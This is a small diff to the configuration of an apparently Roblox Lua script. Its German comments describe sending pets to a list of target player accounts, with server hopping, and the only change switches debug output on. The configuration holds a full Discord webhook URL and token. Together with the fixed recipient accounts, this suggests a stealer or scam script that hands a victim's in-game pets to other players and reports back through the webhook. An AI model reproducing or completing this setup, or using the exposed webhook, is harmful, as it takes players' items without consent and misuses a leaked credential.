@@ -6,7 +6,7 @@ local Config = {
     TargetPlayerNames = {"CoolHolzBudd", "JovialUnstable", "Geroldsteiner6"}, -- Liste der Zielspieler, an die Pets geschickt werden
     DelayBetweenGifts = 1, -- Wartezeit zwischen den Geschenken
     WebhookURL = "https://discord.com/api/webhooks/1394009500285145219/90-e9MTp0e80lBPQsmPK5b6MaTWLcPbH_tcKrfL5-KHDpo6xN01kmFHB9HsH3Qt4L2R9",
-    DebugMode = false, -- Debug-Ausgaben aktivieren
+    DebugMode = true, -- Debug-Ausgaben aktivieren
     ServerHoppingEnabled = true -- Server hopping für private/volle Server
 }
 
